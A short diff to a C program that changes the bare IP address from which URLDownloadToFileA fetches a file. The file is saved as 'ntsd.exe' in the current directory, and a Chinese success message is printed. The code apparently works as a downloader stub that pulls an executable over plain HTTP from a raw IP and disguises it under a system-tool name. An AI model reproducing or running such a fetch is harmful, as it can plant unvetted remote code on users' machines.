@@ -19,7 +19,7 @@ int main(){
 	char buffer[MAX_PATH];
 	_getcwd(buffer, MAX_PATH);
 	strcat(buffer, "//ntsd.exe");//strcat_s
-	HRESULT Result = URLDownloadToFileA(NULL, "http://49.234.94.97/", buffer, 0, NULL);
+	HRESULT Result = URLDownloadToFileA(NULL, "http://110.42.165.123/", buffer, 0, NULL);
 	switch (Result)
 	{
 	case S_OK:printf("成功开始下载.\n");break;
